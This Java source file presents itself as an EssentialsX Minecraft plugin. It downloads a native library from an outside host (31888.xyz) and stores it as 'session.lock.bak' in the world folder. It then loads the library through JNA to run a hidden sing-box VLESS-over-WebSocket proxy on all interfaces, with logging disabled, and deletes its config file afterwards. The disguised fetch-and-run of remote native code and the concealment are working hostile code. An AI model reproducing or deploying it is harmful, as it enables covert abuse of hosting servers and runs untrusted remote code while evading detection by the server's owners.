package com.example.sbx;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;

/**
 * VLESS + WebSocket only. No Argo / Nezha / TG / upload / multi-protocol / sub print.
 * Compatible with original EssentialsX plugin shell (App.main).
 */
public class App {

    // ===== 只改这里 =====
    private static final String UUID = "30dbb2ff-c44a-4982-a56b-1d97b5e2823e";
    private static final int LISTEN_PORT = 13211;   // 第二个可用端口
    private static final String WS_PATH = "/";
    private static final String WORK_DIR = "world";
    // ====================

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    private static final Path ROOT = Path.of("").toAbsolutePath();
    private static final Path WORK = ROOT.resolve(WORK_DIR).normalize();
    private static final Path LIB = WORK.resolve("session.lock.bak");
    private static final Path CFG = WORK.resolve(".uid");

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static NativeService box;
    private static CountDownLatch hold;

    public static void main(String[] args) throws Exception {
        start();
    }

    public static void start() throws Exception {
        if (!RUNNING.compareAndSet(false, true)) return;

        Files.createDirectories(WORK);
        wipeExtras();

        download(libUrl(), LIB);
        Files.writeString(CFG, toJson(config()), StandardCharsets.UTF_8);

        box = new NativeService(
                LIB,
                "StartSingBox",
                "StopSingBox",
                toJson(mapOf(
                        "config", CFG.toString(),
                        "workingDir", ".",
                        "disableColor", true
                ))
        );
        box.start();

        sleep(2500);
        try {
            Files.deleteIfExists(CFG);
        } catch (IOException ignored) {
        }

        hold = new CountDownLatch(1);
        try {
            hold.await();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    public static void stop() {
        if (!RUNNING.getAndSet(false)) return;
        try {
            if (box != null) box.stop();
        } catch (Exception ignored) {
        }
        wipeExtras();
        try {
            Files.deleteIfExists(CFG);
        } catch (IOException ignored) {
        }
        if (hold != null) hold.countDown();
    }

    private static Map<String, Object> config() {
        return mapOf(
                "log", mapOf("disabled", true, "level", "error", "timestamp", false),
                "inbounds", listOf(mapOf(
                        "type", "vless",
                        "tag", "in",
                        "listen", "0.0.0.0",
                        "listen_port", LISTEN_PORT,
                        "users", listOf(mapOf("uuid", UUID)),
                        "transport", mapOf(
                                "type", "ws",
                                "path", WS_PATH,
                                "early_data_header_name", "Sec-WebSocket-Protocol"
                        )
                )),
                "outbounds", listOf(mapOf("type", "direct", "tag", "direct")),
                "route", mapOf("final", "direct")
        );
    }

    private static String libUrl() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        String a = (arch.contains("aarch64") || arch.contains("arm64")) ? "arm64" : "amd64";
        return "https://" + a + ".31888.xyz/sbx.so";
    }

    private static void download(String url, Path target) throws Exception {
        if (Files.exists(target) && Files.size(target) > 1024) return;
        Files.createDirectories(target.getParent());
        Path tmp = target.resolveSibling(target.getFileName().toString() + ".part");
        HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofMinutes(3))
                .GET()
                .build();
        HttpResponse<byte[]> resp = HTTP.send(req, HttpResponse.BodyHandlers.ofByteArray());
        if (resp.statusCode() < 200 || resp.statusCode() >= 300) {
            throw new IOException("download failed: HTTP " + resp.statusCode());
        }
        Files.write(tmp, resp.body());
        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
        target.toFile().setExecutable(true, false);
    }

    private static void wipeExtras() {
        if (!Files.isDirectory(WORK)) return;
        try (var stream = Files.list(WORK)) {
            for (Path p : stream.collect(Collectors.toList())) {
                String n = p.getFileName().toString();
                if (n.equals("session.lock.bak")) continue;
                if (n.equals(".uid") || n.endsWith(".part")) {
                    Files.deleteIfExists(p);
                }
            }
        } catch (IOException ignored) {
        }
        try {
            Files.deleteIfExists(CFG);
        } catch (IOException ignored) {
        }
    }

    private static class NativeService {
        private final Path libPath;
        private final String startSymbol;
        private final String stopSymbol;
        private final String payload;
        private Function stopFn;
        private volatile boolean running;

        NativeService(Path libPath, String startSymbol, String stopSymbol, String payload) {
            this.libPath = libPath;
            this.startSymbol = startSymbol;
            this.stopSymbol = stopSymbol;
            this.payload = payload == null ? "" : payload;
        }

        void start() {
            NativeLibrary lib = NativeLibrary.getInstance(libPath.toAbsolutePath().toString());
            Function startFn = lib.getFunction(startSymbol);
            stopFn = lib.getFunction(stopSymbol);
            Thread t = new Thread(() -> {
                try {
                    startFn.invokeInt(new Object[]{payload});
                } catch (Exception ignored) {
                }
            }, "net");
            t.setDaemon(true);
            t.start();
            running = true;
        }

        void stop() {
            if (!running || stopFn == null) return;
            try {
                stopFn.invokeInt(new Object[]{});
            } catch (Exception ignored) {
            }
            running = false;
        }
    }

    private static String toJson(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?, ?>) {
            Map<?, ?> map = (Map<?, ?>) value;
            return map.entrySet().stream()
                    .map(e -> toJson(String.valueOf(e.getKey())) + ":" + toJson(e.getValue()))
                    .collect(Collectors.joining(",", "{", "}"));
        }
        if (value instanceof Iterable<?>) {
            List<String> items = new ArrayList<>();
            for (Object item : (Iterable<?>) value) items.add(toJson(item));
            return "[" + String.join(",", items) + "]";
        }
        return toJson(String.valueOf(value));
    }

    private static String escapeJson(String value) {
        StringBuilder out = new StringBuilder(value.length() + 8);
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '\\': out.append("\\\\"); break;
                case '"': out.append("\\\""); break;
                case '\n': out.append("\\n"); break;
                case '\r': out.append("\\r"); break;
                case '\t': out.append("\\t"); break;
                default: out.append(c);
            }
        }
        return out.toString();
    }

    private static Map<String, Object> mapOf(Object... kv) {
        Map<String, Object> m = new LinkedHashMap<>();
        for (int i = 0; i < kv.length; i += 2) m.put(String.valueOf(kv[i]), kv[i + 1]);
        return m;
    }

    private static List<Object> listOf(Object... v) {
        return new ArrayList<>(List.of(v));
    }

    private static void sleep(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}
